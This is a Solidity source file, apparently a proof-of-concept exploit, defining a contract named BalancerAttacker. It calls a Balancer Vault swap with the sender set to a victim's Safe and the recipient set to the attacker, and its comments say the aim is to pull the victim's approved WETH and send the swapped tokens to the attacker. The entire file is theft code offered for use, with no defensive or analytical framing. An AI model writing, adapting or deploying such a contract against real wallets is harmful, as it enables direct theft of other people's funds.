// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IBalancerVault {
    struct SingleSwap {
        bytes32 poolId;
        uint8 kind;
        address assetIn;
        address assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
}

contract BalancerAttacker {
    address public immutable vault;
    address public immutable victimSafe;
    address public immutable weth;
    address public immutable owner;

    constructor(address _vault, address _victimSafe, address _weth) {
        vault = _vault;
        victimSafe = _victimSafe;
        weth = _weth;
        owner = msg.sender;
    }

    function attack(bytes32 poolId, address assetOut, uint256 amount) external {
        // Use Balancer swap with `sender = victimSafe` and `recipient = attacker`
        // The Vault will pull WETH from the Safe (due to approve) and send assetOut to attacker
        IBalancerVault.SingleSwap memory singleSwap = IBalancerVault.SingleSwap({
            poolId: poolId,
            kind: 0, // GIVEN_IN
            assetIn: weth,
            assetOut: assetOut,
            amount: amount,
            userData: ""
        });

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: victimSafe,          // ← pull from Safe
            fromInternalBalance: false,
            recipient: payable(owner),   // ← send to attacker
            toInternalBalance: false
        });

        IBalancerVault(vault).swap(singleSwap, funds, 0, block.timestamp + 1 hours);
    }
}
